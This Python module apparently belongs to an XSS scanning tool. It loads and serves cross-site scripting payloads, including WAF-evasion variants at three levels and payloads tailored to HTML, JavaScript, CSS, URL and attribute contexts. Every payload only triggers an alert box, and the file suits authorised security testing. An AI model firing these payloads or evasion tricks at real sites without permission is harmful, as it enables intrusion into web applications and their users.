import os
import json
from typing import List, Dict, Any


class PayloadManager:
    """Manages XSS payloads for testing"""
    
    def __init__(self, payloads_file=None):
        self.payloads_file = payloads_file or os.path.join(
            os.path.dirname(__file__), '..', '..', 'data', 'payloads', 'xss_payloads.txt'
        )
        self.payloads = self._load_payloads()
        self.evasion_payloads = self._generate_evasion_payloads()
    
    def _load_payloads(self) -> List[str]:
        """Load payloads from file"""
        payloads = []
        
        # Default payloads if file doesn't exist
        default_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '"><img src=x onerror=alert("XSS")>',
            '\'><script>alert("XSS")</script>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
            '<input autofocus onfocus=alert("XSS")>',
            '<select autofocus onfocus=alert("XSS")>',
            '<textarea autofocus onfocus=alert("XSS")>',
            '<keygen autofocus onfocus=alert("XSS")>',
            '<details open ontoggle=alert("XSS")>',
            '<video><source onerror=alert("XSS")>',
            '<audio src=x onerror=alert("XSS")>',
            '<embed src="javascript:alert(\'XSS\')">',
            '<object data="javascript:alert(\'XSS\')">',
            '<applet code="javascript:alert(\'XSS\')">',
            '<marquee onstart=alert("XSS")>'
        ]
        
        try:
            if os.path.exists(self.payloads_file):
                with open(self.payloads_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            payloads.append(line)
            else:
                payloads = default_payloads
                
        except Exception as e:
            print(f"Warning: Could not load payloads from {self.payloads_file}: {e}")
            payloads = default_payloads
        
        return payloads
    
    def _generate_evasion_payloads(self) -> Dict[str, List[str]]:
        """Generate WAF evasion payloads"""
        evasion_payloads = {
            'basic': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                'javascript:alert("XSS")'
            ],
            'advanced': [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<img src=x OnErRoR=alert("XSS")>',
                'javascript:alert("XSS")',
                '<svg/onload=alert("XSS")>',
                '<svg><script>alert("XSS")</script></svg>',
                '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
                '<svg><set attributeName=onmouseover to=alert("XSS")>',
                '<svg><animate attributeName=onmouseover values=alert("XSS")>',
                '<svg><animate attributeName=onmouseover from=alert("XSS")>',
                '<svg><animate attributeName=onmouseover to=alert("XSS")>'
            ],
            'extreme': [
                '<svg><script>alert&#40;"XSS"&#41;</script></svg>',
                '<svg><script>alert&#x28;"XSS"&#x29;</script></svg>',
                '<svg><script>alert&#x00028;"XSS"&#x00029;</script></svg>',
                '<svg><script>alert&#x00000028;"XSS"&#x00000029;</script></svg>',
                '<svg><script>alert&#x0000000028;"XSS"&#x0000000029;</script></svg>',
                '<svg><script>alert&#x000000000028;"XSS"&#x000000000029;</script></svg>',
                '<svg><script>alert&#x00000000000028;"XSS"&#x00000000000029;</script></svg>',
                '<svg><script>alert&#x0000000000000028;"XSS"&#x0000000000000029;</script></svg>',
                '<svg><script>alert&#x00000000000000028;"XSS"&#x00000000000000029;</script></svg>',
                '<svg><script>alert&#x000000000000000028;"XSS"&#x000000000000000029;</script></svg>'
            ]
        }
        
        return evasion_payloads
    
    def get_payloads(self, count: int = None, evasion_level: int = 0) -> List[str]:
        """Get payloads for testing"""
        if evasion_level == 0:
            payloads = self.payloads
        else:
            level_map = {1: 'basic', 2: 'advanced', 3: 'extreme'}
            level = level_map.get(evasion_level, 'basic')
            payloads = self.evasion_payloads[level]
        
        if count:
            return payloads[:count]
        return payloads
    
    def get_context_specific_payloads(self, context: str) -> List[str]:
        """Get payloads specific to a context (HTML, JavaScript, CSS, etc.)"""
        context_payloads = {
            'html': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')">'
            ],
            'javascript': [
                '";alert("XSS");//',
                '\';alert("XSS");//',
                '`+alert("XSS")+`',
                '${alert("XSS")}'
            ],
            'css': [
                'expression(alert("XSS"))',
                'url(javascript:alert("XSS"))',
                'url("javascript:alert(\'XSS\')")'
            ],
            'url': [
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                'vbscript:alert("XSS")'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS\')" "',
                '" onfocus="alert(\'XSS\')" "',
                '" onblur="alert(\'XSS\')" "'
            ]
        }
        
        return context_payloads.get(context.lower(), self.payloads)
    
    def add_custom_payload(self, payload: str):
        """Add a custom payload"""
        if payload not in self.payloads:
            self.payloads.append(payload)
    
    def save_payloads(self, filepath: str = None):
        """Save payloads to file"""
        filepath = filepath or self.payloads_file
        
        try:
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            with open(filepath, 'w', encoding='utf-8') as f:
                for payload in self.payloads:
                    f.write(payload + '\n')
        except Exception as e:
            print(f"Error saving payloads: {e}")
    
    def get_payload_statistics(self) -> Dict[str, Any]:
        """Get statistics about available payloads"""
        return {
            'total_payloads': len(self.payloads),
            'basic_evasion': len(self.evasion_payloads['basic']),
            'advanced_evasion': len(self.evasion_payloads['advanced']),
            'extreme_evasion': len(self.evasion_payloads['extreme']),
            'payloads_file': self.payloads_file
        } 